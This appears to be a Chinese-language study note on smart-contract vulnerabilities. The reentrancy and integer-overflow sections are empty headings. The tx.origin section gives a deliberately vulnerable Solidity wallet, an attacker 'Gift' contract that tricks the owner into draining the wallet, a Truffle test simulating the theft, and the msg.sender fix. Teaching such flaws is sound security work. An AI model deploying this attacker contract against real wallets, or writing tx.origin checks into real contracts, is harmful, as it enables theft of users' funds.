# 合约漏洞

## 重入漏洞

进行转账时调用了攻击合约的`fallback()`或`receive()`函数就会产生重入漏洞。

例：


## 整数溢出漏洞


## tx.origi权限控制漏洞

因为`tx.origin`是交易的原始发起者，而不是当前调用的合约地址。黑客就可以利用这个漏洞绕过权限检查。

下面这个合约就存在权限控制漏洞。
``` solidity
contract Wallet {
    address public owner;

    constructor() payable {
        owner = tx.origin;
    }

    function transfer(address payable _to, uint _amount) public {
        require(tx.origin == owner, "Not owner");
        (bool sent, ) = _to.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }
}
```
这是一个钱包合约，部署者可以在部署合约时把钱存到合约中，需要的时候可以通过调用`transfer`函数将钱包中的钱转到其他账户中。

黑客可以部署一个这样的合约诱骗部署者调用将钱转到自己的账户上。
``` solidity
contract Gift {
    address payable public owner;
    Wallet wallet;

    constructor(Wallet _wallet) {
        wallet = Wallet(_wallet);
        owner = payable(msg.sender);
    }

    function receive() public {
        wallet.transfer(owner,address(wallet).balance);
    }
}
```
当`Wallet`的所有者调用`receive`函数时，`Wallet`中所有余额就被不知不觉地转到了黑客的账户中。

下面是truffle模拟
``` js
const Wallet = artifacts.require("Wallet");
const Gift = artifacts.require("Gift");
contract("test",(accounts)=>{
    it("正常转账",async ()=>{
        //创建钱包，存10ether
        const wallet = await Wallet.new({from:accounts[0],value:web3.utils.toWei("10","ether")});
        //转账给自己
        await wallet.transfer(accounts[0],web3.utils.toWei("10","ether"));
        assert.equal(await web3.eth.getBalance(wallet.address),web3.utils.toWei("0","ether"));
    });
    it("领取礼物",async ()=>{
        //创建钱包，存10ether
        const wallet = await Wallet.new({from:accounts[0],value:web3.utils.toWei("10","ether")});
        //黑客部署 gift
        const gift = await Gift.new(wallet.address,{from:accounts[1]});
        //领取礼物
        await gift.receive({from:accounts[0]});
        //钱包里的钱已经被黑客转走
        assert.equal(await web3.eth.getBalance(wallet.address),0);
    })
});
```

解决方法：将`tx.origin `换成`msg.sender`即可。





